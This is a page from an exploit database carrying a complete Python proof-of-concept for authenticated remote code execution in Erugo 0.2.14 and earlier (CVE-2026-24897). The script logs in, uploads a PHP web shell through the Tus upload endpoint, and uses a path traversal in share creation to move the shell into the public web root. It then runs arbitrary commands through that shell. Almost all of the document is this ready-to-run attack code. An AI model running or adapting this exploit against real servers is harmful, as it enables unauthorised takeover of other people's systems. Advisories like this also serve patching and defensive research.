---
title: Erugo  0.2.14 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2026050004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-04
fetch_date: 2026-05-05T04:56:22.147684
---

# Erugo  0.2.14 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Erugo 0.2.14 Remote Code Execution (RCE)** **2026.05.04**  Credit:  **[Abdul Moiz](https://cxsecurity.com/author/Abdul%2BMoiz/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-24897](https://cxsecurity.com/cveshow/CVE-2026-24897/ "Click to see CVE-2026-24897")**  CWE: **N/A** | |

# Exploit Title: Erugo <= 0.2.14 - Authenticated Remote Code Execution (RCE)
# Date: 2026-02-02
# Exploit Author: Abdul Moiz
# Vendor Homepage: https://github.com/ErugoOSS/Erugo
# Software Link: https://hub.docker.com/layers/wardy784/erugo/0.2.14/images/sha256-d3da70b337212a6c774b7028256870274edc2ac40536fcc0f1706cbbc4ed4fbf
# Version: <= 0.2.14
# Tested on: Linux (Docker)
# CVE: CVE-2026-24897
import requests
import json
import sys
import time
import base64
import argparse
import random
import string
import warnings
from datetime import datetime, timedelta, timezone
# Disable SSL & Deprecation Warnings for clean output
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable\_warnings(InsecureRequestWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)
class ErugoExploit:
def \_\_init\_\_(self, target, username, password):
self.target = target.rstrip("/")
self.username = username
self.password = password
self.session = requests.Session()
# Standard Headers
self.session.headers.update({
"User-Agent": "Mozilla/5.0 (Exploit-DB)",
"Accept": "application/json",
"Tus-Resumable": "1.0.0"
})
# Generate a random 8-char filename to prevent collisions
rand\_str = ''.join(random.choices(string.ascii\_lowercase + string.digits, k=8))
self.shell\_name = f"{rand\_str}.php"
self.shell\_content = '<?php system($\_GET["cmd"]); ?>'
def get\_csrf(self):
"""Initialize session cookies"""
print("[\*] Initializing session...")
try:
self.session.get(f"{self.target}/login", verify=False, timeout=10)
except Exception as e:
print(f"[-] Connection failed: {e}")
sys.exit(1)
def login(self):
print(f"[\*] Authenticating as {self.username}...")
url = f"{self.target}/api/auth/login"
data = {"email": self.username, "password": self.password}
try:
r = self.session.post(url, json=data, verify=False, timeout=10)
if r.status\_code == 200:
token = r.json().get("data", {}).get("access\_token")
if token:
self.session.headers.update({"Authorization": f"Bearer {token}"})
print("[+] Login Successful.")
return True
except Exception as e:
pass
print("[-] Login Failed. Check credentials.")
sys.exit(1)
def upload\_payload(self):
print(f"[\*] Uploading {self.shell\_name} via Tus Protocol...")
# 1. Tus Creation (POST)
post\_url = f"{self.target}/files/"
# Base64 Encode metadata
filename\_b64 = base64.b64encode(self.shell\_name.encode()).decode()
filetype\_b64 = base64.b64encode(b"application/x-php").decode()
headers = {
"Upload-Length": str(len(self.shell\_content)),
"Upload-Metadata": f"filename {filename\_b64},filetype {filetype\_b64}"
}
try:
r = self.session.post(post\_url, headers=headers, verify=False, timeout=10)
if r.status\_code != 201:
print(f"[-] Tus creation failed. Status: {r.status\_code}")
sys.exit(1)
location = r.headers.get("Location")
file\_id = location.split("/")[-1]
# 2. Tus Data Transfer (PATCH)
patch\_headers = {
"Content-Type": "application/offset+octet-stream",
"Upload-Offset": "0"
}
r = self.session.patch(location, headers=patch\_headers, data=self.shell\_content, verify=False, timeout=10)
if r.status\_code == 204:
print(f"[+] Payload uploaded. ID: {file\_id}")
return file\_id
else:
print(f"[-] Data upload failed. Status: {r.status\_code}")
sys.exit(1)
except Exception as e:
print(f"[-] Upload error: {e}")
sys.exit(1)
def trigger\_path\_traversal(self, file\_id):
print("[\*] Creating malicious share...")
url = f"{self.target}/api/uploads/create-share-from-uploads"
# Fix Date Warning: Use timezone-aware UTC
tomorrow = datetime.now(timezone.utc) + timedelta(days=1)
expiry = tomorrow.strftime("%Y-%m-%dT%H:%M:%S.000Z")
payload = {
"upload\_id": "exploit",
"name": "exploit\_share",
"recipients": [],
"uploadIds": [file\_id],
"filePaths": {
# VULNERABILITY: Path Traversal
file\_id: f"../../../../../public/{self.shell\_name}"
},
"expiry\_date": expiry,
"password": "",
"password\_confirm": ""
}
try:
r = self.session.post(url, json=payload, verify=False, timeout=10)
if r.status\_code not in [200, 201]:
print(f"[-] Share creation failed. Status: {r.status\_code}")
print(f" Response: {r.text}")
sys.exit(1)
print("[+] Malicious share created.")
except Exception as e:
print(f"[-] Error creating share: {e}")
sys.exit(1)
def execute\_command(self, cmd):
shell\_url = f"{self.target}/{self.shell\_name}"
print(f"[\*] Executing command: '{cmd}' at {shell\_url}")
time.sleep(1) # Wait for filesystem sync
try:
r = self.session.get(shell\_url, params={"cmd": cmd}, verify=False, timeout=10)
if r.status\_code == 200:
print("\n" + "="\*50)
print(f"COMMAND OUTPUT:")
print(r.text.strip())
print("="\*50 + "\n")
else:
print(f"[-] Command failed. Status: {r.status\_code}")
except Exception as e:
print(f"[-] Execution error: {e}")
def main():
parser = argparse.ArgumentParser(description='Erugo <= 0.2.14 Authenticated RCE')
parser.add\_argument('-t', '--target', required=True, help='Target URL (e.g., http://localhost:9998)')
parser.add\_argument('-u', '--username', required=True, help='User email')
parser.add\_argument('-p', '--password', required=True, help='User password')
parser.add\_argument('-c', '--command', default='id', help='Command to execute (default: id)')
args = parser.parse\_args()
exploit = ErugoExploit(args.target, args.username, args.password)
exploit.get\_csrf()
exploit.login()
fid = exploit.upload\_payload()
exploit.trigger\_path\_traversal(fid)
exploit.execute\_command(args.command)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - require...